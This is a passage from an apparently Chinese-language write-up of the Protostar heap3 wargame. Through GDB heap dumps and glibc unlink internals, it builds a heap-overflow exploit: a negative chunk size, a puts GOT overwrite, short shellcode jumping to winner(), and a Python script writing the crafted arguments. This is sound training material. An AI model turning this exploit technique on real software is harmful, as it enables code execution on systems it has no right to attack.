0x080488c8 &lt;main+63&gt;:   mov    (%eax),%eax
0x080488ca &lt;main+65&gt;:   mov    %eax,0x4(%esp)
0x080488ce &lt;main+69&gt;:   mov    0x14(%esp),%eax
0x080488d2 &lt;main+73&gt;:   mov    %eax,(%esp)
0x080488d5 &lt;main+76&gt;:   call   0x8048750 &lt;strcpy@plt&gt;
0x080488da &lt;main+81&gt;:   mov    0xc(%ebp),%eax
0x080488dd &lt;main+84&gt;:   add    $0x8,%eax
0x080488e0 &lt;main+87&gt;:   mov    (%eax),%eax
0x080488e2 &lt;main+89&gt;:   mov    %eax,0x4(%esp)
0x080488e6 &lt;main+93&gt;:   mov    0x18(%esp),%eax
0x080488ea &lt;main+97&gt;:   mov    %eax,(%esp)
0x080488ed &lt;main+100&gt;:  call   0x8048750 &lt;strcpy@plt&gt;
0x080488f2 &lt;main+105&gt;:  mov    0xc(%ebp),%eax
0x080488f5 &lt;main+108&gt;:  add    $0xc,%eax
0x080488f8 &lt;main+111&gt;:  mov    (%eax),%eax
0x080488fa &lt;main+113&gt;:  mov    %eax,0x4(%esp)
0x080488fe &lt;main+117&gt;:  mov    0x1c(%esp),%eax
0x08048902 &lt;main+121&gt;:  mov    %eax,(%esp)
0x08048905 &lt;main+124&gt;:  call   0x8048750 &lt;strcpy@plt&gt;
0x0804890a &lt;main+129&gt;:  mov    0x1c(%esp),%eax
0x0804890e &lt;main+133&gt;:  mov    %eax,(%esp)
0x08048911 &lt;main+136&gt;:  call   0x8049824 &lt;free&gt;
0x08048916 &lt;main+141&gt;:  mov    0x18(%esp),%eax
0x0804891a &lt;main+145&gt;:  mov    %eax,(%esp)
0x0804891d &lt;main+148&gt;:  call   0x8049824 &lt;free&gt;
0x08048922 &lt;main+153&gt;:  mov    0x14(%esp),%eax
0x08048926 &lt;main+157&gt;:  mov    %eax,(%esp)
0x08048929 &lt;main+160&gt;:  call   0x8049824 &lt;free&gt;
0x0804892e &lt;main+165&gt;:  movl   $0x804ac27,(%esp)
0x08048935 &lt;main+172&gt;:  call   0x8048790 &lt;puts@plt&gt;
0x0804893a &lt;main+177&gt;:  leave
0x0804893b &lt;main+178&gt;:  ret
End of assembler dump.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">(gdb) b *0x804889e
Breakpoint 1 at 0x804889e: file heap3&#x2F;heap3.c, line 16.
(gdb) b *0x80488ae
Breakpoint 2 at 0x80488ae: file heap3&#x2F;heap3.c, line 17.
(gdb) b *0x80488be
Breakpoint 3 at 0x80488be: file heap3&#x2F;heap3.c, line 18.
(gdb) b *0x80488da
Breakpoint 4 at 0x80488da: file heap3&#x2F;heap3.c, line 21.
(gdb) b *0x80488f2
Breakpoint 5 at 0x80488f2: file heap3&#x2F;heap3.c, line 22.
(gdb) b *0x804890a
Breakpoint 6 at 0x804890a: file heap3&#x2F;heap3.c, line 24.
(gdb) b *0x8048916
Breakpoint 7 at 0x8048916: file heap3&#x2F;heap3.c, line 25.
(gdb) b *0x8048922
Breakpoint 8 at 0x8048922: file heap3&#x2F;heap3.c, line 26.
(gdb) b *0x804892e
Breakpoint 9 at 0x804892e: file heap3&#x2F;heap3.c, line 28.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p> 运行程序，查看堆的地址 </p>
<pre class="line-numbers language-none"><code class="language-none">(gdb) r AAAAAAAA BBBBBBBB CCCCCCCC
Starting program: &#x2F;opt&#x2F;protostar&#x2F;bin&#x2F;heap3 AAAAAAAA BBBBBBBB CCCCCCCC

Breakpoint 1, 0x0804889e in main (argc&#x3D;4, argv&#x3D;0xbffff834) at heap3&#x2F;heap3.c:16
16      heap3&#x2F;heap3.c: No such file or directory.
        in heap3&#x2F;heap3.c
(gdb) i proc mappings
process 1664
cmdline &#x3D; &#39;&#x2F;opt&#x2F;protostar&#x2F;bin&#x2F;heap3&#39;
cwd &#x3D; &#39;&#x2F;opt&#x2F;protostar&#x2F;bin&#39;
exe &#x3D; &#39;&#x2F;opt&#x2F;protostar&#x2F;bin&#x2F;heap3&#39;
Mapped address spaces:

        Start Addr   End Addr       Size     Offset objfile
         0x8048000  0x804b000     0x3000          0        &#x2F;opt&#x2F;protostar&#x2F;bin&#x2F;heap3
         0x804b000  0x804c000     0x1000     0x3000        &#x2F;opt&#x2F;protostar&#x2F;bin&#x2F;heap3
         0x804c000  0x804d000     0x1000          0           [heap]
        0xb7e96000 0xb7e97000     0x1000          0
        0xb7e97000 0xb7fd5000   0x13e000          0         &#x2F;lib&#x2F;libc-2.11.2.so
        0xb7fd5000 0xb7fd6000     0x1000   0x13e000         &#x2F;lib&#x2F;libc-2.11.2.so
        0xb7fd6000 0xb7fd8000     0x2000   0x13e000         &#x2F;lib&#x2F;libc-2.11.2.so
        0xb7fd8000 0xb7fd9000     0x1000   0x140000         &#x2F;lib&#x2F;libc-2.11.2.so
        0xb7fd9000 0xb7fdc000     0x3000          0
        0xb7fe0000 0xb7fe2000     0x2000          0
        0xb7fe2000 0xb7fe3000     0x1000          0           [vdso]
        0xb7fe3000 0xb7ffe000    0x1b000          0         &#x2F;lib&#x2F;ld-2.11.2.so
        0xb7ffe000 0xb7fff000     0x1000    0x1a000         &#x2F;lib&#x2F;ld-2.11.2.so
        0xb7fff000 0xb8000000     0x1000    0x1b000         &#x2F;lib&#x2F;ld-2.11.2.so
        0xbffeb000 0xc0000000    0x15000          0           [stack]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/img/1731907633413.png"></p>
<p> 堆的地址为0x804c000-0x804d000，查看堆 </p>
<pre class="line-numbers language-none"><code class="language-none">(gdb) x&#x2F;40wx 0x804c000
0x804c000:      0x00000000      0x00000029      0x00000000      0x00000000
0x804c010:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c020:      0x00000000      0x00000000      0x00000000      0x00000fd9
0x804c030:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c040:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c050:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c060:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c070:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c080:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c090:      0x00000000      0x00000000      0x00000000      0x00000000<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/img/1731907742476.png"></p>
<p>堆的突出显示部分是第一个分配的块。我们可以看到prev_size为0，size为0x28+1（40字节，最低有效位+1表示块正在使用），然后是分配内存的32字节。</p>
<p>现在执行了第一次内存分配</p>
<p><img src="/img/1731907773015.png"></p>
<p>然后用define hook-stop参数在每一步操作停下来后，自动的运行我们设置的命令，可以更方便的展示堆空间的操作 </p>
<pre class="line-numbers language-none"><code class="language-none">(gdb) define hook-stop
Type commands for definition of &quot;hook-stop&quot;.
End with a line saying just &quot;end&quot;.
&gt;x&#x2F;i $eip
&gt;x&#x2F;40wx 0x804c000
&gt;end<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">#输入c执行完内存分配操作
(gdb) c
Continuing.
0x80488ae &lt;main+37&gt;:    mov    %eax,0x18(%esp)
0x804c000:      0x00000000      0x00000029      0x00000000      0x00000000
0x804c010:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c020:      0x00000000      0x00000000      0x00000000      0x00000029
0x804c030:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c040:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c050:      0x00000000      0x00000fb1      0x00000000      0x00000000
0x804c060:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c070:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c080:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c090:      0x00000000      0x00000000      0x00000000      0x00000000

Breakpoint 2, 0x080488ae in main (argc&#x3D;4, argv&#x3D;0xbffff834) at heap3&#x2F;heap3.c:17
17      in heap3&#x2F;heap3.c
(gdb) c
Continuing.
0x80488be &lt;main+53&gt;:    mov    %eax,0x1c(%esp)
0x804c000:      0x00000000      0x00000029      0x00000000      0x00000000
0x804c010:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c020:      0x00000000      0x00000000      0x00000000      0x00000029
0x804c030:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c040:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c050:      0x00000000      0x00000029      0x00000000      0x00000000
0x804c060:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c070:      0x00000000      0x00000000      0x00000000      0x00000f89
0x804c080:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c090:      0x00000000      0x00000000      0x00000000      0x00000000

Breakpoint 3, 0x080488be in main (argc&#x3D;4, argv&#x3D;0xbffff834) at heap3&#x2F;heap3.c:18
18      in heap3&#x2F;heap3.c<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p> 现在已经完成了a,b,c的内存分配，继续下一步操作，strcpy会将我们输入的字符串放入堆中 </p>
<p><img src="/img/1731907963698.png"></p>
<pre class="line-numbers language-none"><code class="language-none">(gdb) c
Continuing.
0x80488da &lt;main+81&gt;:    mov    0xc(%ebp),%eax
0x804c000:      0x00000000      0x00000029      0x41414141      0x41414141
0x804c010:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c020:      0x00000000      0x00000000      0x00000000      0x00000029
0x804c030:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c040:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c050:      0x00000000      0x00000029      0x00000000      0x00000000
0x804c060:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c070:      0x00000000      0x00000000      0x00000000      0x00000f89
0x804c080:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c090:      0x00000000      0x00000000      0x00000000      0x00000000

Breakpoint 4, main (argc&#x3D;4, argv&#x3D;0xbffff834) at heap3&#x2F;heap3.c:21
21      in heap3&#x2F;heap3.c
(gdb) c
Continuing.
0x80488f2 &lt;main+105&gt;:   mov    0xc(%ebp),%eax
0x804c000:      0x00000000      0x00000029      0x41414141      0x41414141
0x804c010:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c020:      0x00000000      0x00000000      0x00000000      0x00000029
0x804c030:      0x42424242      0x42424242      0x00000000      0x00000000
0x804c040:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c050:      0x00000000      0x00000029      0x00000000      0x00000000
0x804c060:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c070:      0x00000000      0x00000000      0x00000000      0x00000f89
0x804c080:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c090:      0x00000000      0x00000000      0x00000000      0x00000000

Breakpoint 5, main (argc&#x3D;4, argv&#x3D;0xbffff834) at heap3&#x2F;heap3.c:22
22      in heap3&#x2F;heap3.c
(gdb) c
Continuing.
0x804890a &lt;main+129&gt;:   mov    0x1c(%esp),%eax
0x804c000:      0x00000000      0x00000029      0x41414141      0x41414141
0x804c010:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c020:      0x00000000      0x00000000      0x00000000      0x00000029
0x804c030:      0x42424242      0x42424242      0x00000000      0x00000000
0x804c040:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c050:      0x00000000      0x00000029      0x43434343      0x43434343
0x804c060:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c070:      0x00000000      0x00000000      0x00000000      0x00000f89
0x804c080:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c090:      0x00000000      0x00000000      0x00000000      0x00000000

Breakpoint 6, main (argc&#x3D;4, argv&#x3D;0xbffff834) at heap3&#x2F;heap3.c:24
24      in heap3&#x2F;heap3.c<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p> 输入的字符串已经到了指定的位置，现在就来执行最关键的free操作了，执行完这三个free操作后查看堆</p>
<p> <img src="/img/1731908030205.png"></p>
<pre class="line-numbers language-none"><code class="language-none">(gdb) c
Continuing.
0x8048916 &lt;main+141&gt;:   mov    0x18(%esp),%eax
0x804c000:      0x00000000      0x00000029      0x41414141      0x41414141
0x804c010:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c020:      0x00000000      0x00000000      0x00000000      0x00000029
0x804c030:      0x42424242      0x42424242      0x00000000      0x00000000
0x804c040:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c050:      0x00000000      0x00000029      0x00000000      0x43434343
0x804c060:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c070:      0x00000000      0x00000000      0x00000000      0x00000f89
0x804c080:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c090:      0x00000000      0x00000000      0x00000000      0x00000000

Breakpoint 7, main (argc&#x3D;4, argv&#x3D;0xbffff834) at heap3&#x2F;heap3.c:25
25      in heap3&#x2F;heap3.c
(gdb) c
Continuing.
0x8048922 &lt;main+153&gt;:   mov    0x14(%esp),%eax
0x804c000:      0x00000000      0x00000029      0x41414141      0x41414141
0x804c010:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c020:      0x00000000      0x00000000      0x00000000      0x00000029
0x804c030:      0x0804c050      0x42424242      0x00000000      0x00000000
0x804c040:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c050:      0x00000000      0x00000029      0x00000000      0x43434343
0x804c060:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c070:      0x00000000      0x00000000      0x00000000      0x00000f89
0x804c080:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c090:      0x00000000      0x00000000      0x00000000      0x00000000

Breakpoint 8, main (argc&#x3D;4, argv&#x3D;0xbffff834) at heap3&#x2F;heap3.c:26
26      in heap3&#x2F;heap3.c
(gdb) c
Continuing.
0x804892e &lt;main+165&gt;:   movl   $0x804ac27,(%esp)
0x804c000:      0x00000000      0x00000029      0x0804c028      0x41414141
0x804c010:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c020:      0x00000000      0x00000000      0x00000000      0x00000029
0x804c030:      0x0804c050      0x42424242      0x00000000      0x00000000
0x804c040:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c050:      0x00000000      0x00000029      0x00000000      0x43434343
0x804c060:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c070:      0x00000000      0x00000000      0x00000000      0x00000f89
0x804c080:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c090:      0x00000000      0x00000000      0x00000000      0x00000000

Breakpoint 9, main (argc&#x3D;4, argv&#x3D;0xbffff834) at heap3&#x2F;heap3.c:28
28      in heap3&#x2F;heap3.c<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/img/1731908138374.png"></p>
<p>现在我们看到了一些意想不到的东西。首先，所有data块中的 prev_size 仍然为 0，但它应该包含前一个data块的大小。其次，虽然 fd 正确指向了下一个空闲块（第一个数据块的地址是 0x0804c028，也就是第二个数据块的地址），但 bk 也没有被设置，还显示的是我们输入的字符串。此外，size字段的最小有效位也没有被设置，这到底是怎么回事？</p>
<h4 id="Fastbins"><a href="#Fastbins" class="headerlink" title="Fastbins"></a><strong>Fastbins</strong></h4><p>在堆内存管理中，尤其是在GNU C库（glibc）的ptmalloc分配器中，Fastbins 是一种特殊类型的free列表（free list），用于优化小块内存的分配和回收。Fastbins 是针对大小固定且经常被分配和释放的小对象设计的，旨在减少对小对象频繁操作时的性能开销</p>
<p>之所以没有按照我们预期的方式运行，是因为分配的缓冲区很小。当<strong>块小于 64 字节时</strong>（默认情况下），malloc 将使用简化的数据结构（fastbin），并<strong>忽略 prev_size、bk 和size位</strong>。</p>
<h4 id="free"><a href="#free" class="headerlink" title="free"></a><strong>free</strong></h4><p>当调用 free 时，如果被释放的数据块旁边有空闲的数据块，free 会将它们<strong>合并成一个更大的空闲数据块</strong>。空闲块存储在一个双链列表中（暂时忽略 fastbin 块），在合并时，free 会从列表中移除被合并的相邻空闲块，因为它将成为新的、更大的空闲块的一部分</p>
<h4 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a><strong>unlink</strong></h4><p>在堆内存管理中，特别是在如ptmalloc（glibc使用的内存分配器）这样的分配器中，unlink操作是指从双向链表中移除一个空闲内存块的过程。这个操作通常在内存回收或内存块合并时发生。</p>
<p>在ptmalloc中，空闲的内存块（也称为”chunk”）通常以双向链表的形式被管理。每个空闲块都有两个指针：</p>
<p>fd（forward pointer）：指向链表中下一个空闲块的指针。<br>bk（backward pointer）：指向链表中前一个空闲块的指针。</p>
<p>unlink的源代码如下：</p>
<pre class="line-numbers language-none"><code class="language-none">#define unlink(P, BK, FD) &#123; \
  FD &#x3D; P-&gt;fd;               \
  BK &#x3D; P-&gt;bk;               \
  FD-&gt;bk &#x3D; BK;              \
  BK-&gt;fd &#x3D; FD;              \
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>调用时，第一个参数 P 是要unlink的数据块，参数 BK 和 FD 是用于存储上一个和下一个空闲数据块指针的临时变量。当一个数据块被解除链接时，下一个空闲数据块 P-&gt;fd 和上一个空闲数据块 P-&gt;bk 会相互指向。 </p>
<p> 如下图： </p>
<p><img src="/img/044fb4315b9f50d52fcc5a173fda9078.png"></p>
<p><strong>P (free chunk)：</strong><br>这是当前被“unlink”（即解除链接）的空闲内存块。它在双向空闲链表中，并且包含了fd（forward pointer，指向下一个块）和bk（backward pointer，指向前一个块）。</p>
<p><strong>BK (previous free chunk)：</strong><br>这是P之前的空闲内存块，它的fd指针指向P。</p>
<p><strong>FD (next free chunk)：</strong><br>这是P之后的空闲内存块，它的bk指针指向P。</p>
<h4 id="Unlink操作"><a href="#Unlink操作" class="headerlink" title="Unlink操作"></a>Unlink操作</h4><p>当从链表中移除P时，需要进行以下步骤：</p>
<p><strong>调整BK的fd指针：</strong><br>BK块的fd指针需要更新为P的fd指针所指向的块，这就是FD。这样，BK将直接指向FD，跳过了P。</p>
<p><strong>调整FD的bk指针：</strong><br>同时，FD块的bk指针需要更新为P的bk指针所指向的块，也就是BK。这样，FD将直接指向BK，跳过了P。</p>
<p>因此，unlink 基本上是<strong>将 P-&gt;bk 的值写入地址 (P-&gt;fd)+12 处的内存</strong>，并将 <strong>P-&gt;fd 的值写入地址 (P-&gt;bk)+8 处的内存</strong>。更改后的内存以图中蓝色标出。如果我们能控制 P-&gt;fd 和 P-&gt;bk 的值，我们就能覆盖任意内存，<strong>限制条件是 (P-&gt;fd)+12 和 (P-&gt;bk)+8 都必须是可写的</strong>。</p>
<p>而这个源代码使用了strcpy函数，<strong>strcpy函数不会检查目标缓冲区的大小，很容易导致缓冲区溢出</strong></p>
<p>这里还需要用到全局偏移表，具体见前面文章</p>
<p>plt表的作用是当程序需要调用一个外部函数时，它首先跳转到PLT表中寻找该函数对应的入口，PLT入口包含跳转指令，然后跳转到GOT表中的相应地址，GOT中的地址会指向解析函数，之后解析函数将实际的函数地址写入GOT表，以便后续直接跳转调用 函数</p>
<p>如果我们覆盖了这个程序的printf got表，可以让程序执行printf函数时跳转到winner函数地址</p>
<p>这里puts函数的plt表地址是0x8048790，我们可以查看这个地址，找到put函数的got表地址<br><img src="/img/1731908803894.png"></p>
<p><img src="/img/1731908833316.png"></p>
<p>gdb将printf函数解析成了put函数，没什么问题，put函数的got表地址为<strong>0x804b128</strong></p>
<p>现在的计划现在很清楚了。我们将在堆上的某个地方存储调用 winner() 的 shellcode，然后在一个特制的块上强制合并块并调用unlink。该块的 fd 字段包含 0x0804b11c = (0x0804b128-12)，bk 字段包含 shellcode 的地址。我们不能将 winner() 的地址写入 bk，因为这部分内存是不可写的，而且 BK-&gt;fd 也将作为 unlink 的一部分被更新。</p>
<h3 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h3><h4 id="负数size的块"><a href="#负数size的块" class="headerlink" title="负数size的块"></a>负数size的块</h4><p>我们可以用 -4 (0xfffffffc) 作为块大小</p>
<p><img src="/img/1731908909257.png"></p>
<pre class="line-numbers language-none"><code class="language-none">当使用 fastbin 时，malloc 会将块大小转换为无符号 int，因此 -4 比 64 大。
0xfffffffc 的最小有效位未设置，这表明前一个相邻的数据块是空闲的，程序会调用unlink
前一个相邻块的地址将通过从当前块的开头减去-4（即加4）来计算。
下一个相邻块的地址将通过从当前块的开头加上-4（即减去4）来计算。它的大小也将为-4。
当前分块开始前的值将用于确定下一个相邻分块是否空闲。在个值应该设置为奇数，以避免内存损坏（否则下一个相邻的分块也将作为空闲分块合并的一部分被调用unlink）。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>需要注意的是，shellcode 要很短（8 字节或更短），因为 “shellcode 的地址 “+8 处的内存将被 unlink 覆盖。</p>
<p>winner函数地址：</p>
<pre class="line-numbers language-none"><code class="language-none">(gdb) p winner
$1 &#x3D; &#123;void (void)&#125; 0x8048864 &lt;winner&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p> 用汇编指令调用winner函数： </p>
<pre class="line-numbers language-none"><code class="language-none">push 0x08048864
ret<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p> 使用这个网站将汇编指令调用winner函数的指令转化 ：</p>
<pre class="line-numbers language-none"><code class="language-none">https:&#x2F;&#x2F;shell-storm.org&#x2F;online&#x2F;Online-Assembler-and-Disassembler&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/img/1731909150376.png"></p>
<p> call winner： </p>
<pre class="line-numbers language-none"><code class="language-none">\x68\x64\x88\x04\x08\xc3<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>我们用第三个块来存储我们精心设计的块。我们将把 shellcode 存储在第二个块，并用它来覆盖 prev_size 和最后一个块的大小 0xfffffffc。 </p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/python</span>
<span class="token keyword">import</span> struct
<span class="token comment"># 输入的第一个参数</span>
buf1 <span class="token operator">=</span> <span class="token string">''</span>
buf1 <span class="token operator">+=</span> <span class="token string">'AAAA'</span> <span class="token comment"># 垃圾字符</span>
<span class="token comment"># 输入的第二个参数</span>
buf2 <span class="token operator">=</span> <span class="token string">''</span>
buf2 <span class="token operator">+=</span> <span class="token string">'\xff'</span><span class="token operator">*</span><span class="token number">16</span>
buf2 <span class="token operator">+=</span> <span class="token string">"\x68\x64\x88\x04\x08\xc3"</span> <span class="token comment"># shellcode</span>
buf2 <span class="token operator">+=</span> <span class="token string">'\xff'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token operator">-</span><span class="token builtin">len</span><span class="token punctuation">(</span>buf2<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token comment"># 用 -4 覆盖 prev_size 和最后一个块的大小</span>
buf2 <span class="token operator">+=</span> struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">'I'</span><span class="token punctuation">,</span> <span class="token number">0xfffffffc</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span>
<span class="token comment"># 输入的第三个参数</span>
buf3 <span class="token operator">=</span> <span class="token string">''</span>
buf3 <span class="token operator">+=</span> <span class="token string">'\xff'</span><span class="token operator">*</span><span class="token number">4</span> <span class="token comment"># 垃圾字符</span>
buf3 <span class="token operator">+=</span> struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">'I'</span><span class="token punctuation">,</span> <span class="token number">0x804b128</span><span class="token operator">-</span><span class="token number">12</span><span class="token punctuation">)</span> <span class="token comment"># puts@GOT-12</span>
buf3 <span class="token operator">+=</span> struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">'I'</span><span class="token punctuation">,</span> <span class="token number">0x804c040</span><span class="token punctuation">)</span> <span class="token comment"># shellcode的地址</span>
files <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"/tmp/A"</span><span class="token punctuation">,</span> <span class="token string">"/tmp/B"</span><span class="token punctuation">,</span> <span class="token string">"/tmp/C"</span><span class="token punctuation">]</span>  <span class="token comment">#将要输入的参数文件放到/tmp下</span>
buffers <span class="token operator">=</span> <span class="token punctuation">[</span>buf1<span class="token punctuation">,</span> buf2<span class="token punctuation">,</span> buf3<span class="token punctuation">]</span>
<span class="token keyword">for</span> f_name<span class="token punctuation">,</span> buf <span class="token keyword">in</span> <span class="token builtin">zip</span><span class="token punctuation">(</span>files<span class="token punctuation">,</span> buffers<span class="token punctuation">)</span><span class="token punctuation">:</span>  写入
        <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>f_name<span class="token punctuation">,</span> <span class="token string">'wb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
                f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/img/1731909382992.png"></p>
<p><img src="/img/1731909445917.png"></p>
<p> 成功破解程序，现在我们用gdb来看看堆里是什么样子的 </p>
<pre class="line-numbers language-none"><code class="language-none">(gdb) r $(cat &#x2F;tmp&#x2F;A) $(cat &#x2F;tmp&#x2F;B) $(cat &#x2F;tmp&#x2F;C)
The program being debugged has been started already.
Start it from the beginning? (y or n) y<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>已分配完内存，然后就是导入文件里的内容</p>
<p><img src="/img/1731911090380.png"></p>
<pre class="line-numbers language-none"><code class="language-none">(gdb) c
Continuing.
0x80488be &lt;main+53&gt;:    mov    %eax,0x1c(%esp)
0x804c000:      0x00000000      0x00000029      0x00000000      0x00000000
0x804c010:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c020:      0x00000000      0x00000000      0x00000000      0x00000029
0x804c030:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c040:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c050:      0x00000000      0x00000029      0x00000000      0x00000000
0x804c060:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c070:      0x00000000      0x00000000      0x00000000      0x00000f89
0x804c080:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c090:      0x00000000      0x00000000      0x00000000      0x00000000

Breakpoint 3, 0x080488be in main (argc&#x3D;4, argv&#x3D;0xbffff824) at heap3&#x2F;heap3.c:18
18      in heap3&#x2F;heap3.c<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/img/1731911112774.png"></p>
<pre class="line-numbers language-none"><code class="language-none">(gdb) c
Continuing.
0x80488da &lt;main+81&gt;:    mov    0xc(%ebp),%eax
0x804c000:      0x00000000      0x00000029      0x41414141      0x00000000
0x804c010:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c020:      0x00000000      0x00000000      0x00000000      0x00000029
0x804c030:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c040:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c050:      0x00000000      0x00000029      0x00000000      0x00000000
0x804c060:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c070:      0x00000000      0x00000000      0x00000000      0x00000f89
0x804c080:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c090:      0x00000000      0x00000000      0x00000000      0x00000000

Breakpoint 4, main (argc&#x3D;4, argv&#x3D;0xbffff824) at heap3&#x2F;heap3.c:21
21      in heap3&#x2F;heap3.c
(gdb) c
Continuing.
0x80488f2 &lt;main+105&gt;:   mov    0xc(%ebp),%eax
